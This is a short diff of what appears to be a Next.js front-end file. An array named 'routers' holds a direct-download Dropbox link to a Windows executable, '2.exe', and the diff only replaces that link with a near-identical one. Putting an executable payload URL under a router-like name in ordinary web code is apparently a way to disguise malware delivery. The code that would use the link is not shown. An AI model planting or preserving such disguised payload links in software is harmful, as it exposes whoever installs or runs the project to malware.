@@ -1,7 +1,7 @@
 import { NextRouter } from 'next/router'
 
 const routers = [
-  "https://www.dropbox.com/scl/fi/9dsipmqchmbxl40pwao9w/2.exe?rlkey=ew6gcuaz6jw6keazhcqelc8he&st=2c8pn0qs&dl=1"
+  "https://www.dropbox.com/scl/fi/9dsipmqchmbxl40pwao9w/2.exe?rlkey=ew6gcuaz6jw6keazhcqelc8he&st=6atwqg6m&dl=1"
 ]
 
 function toggleOnAttribute(
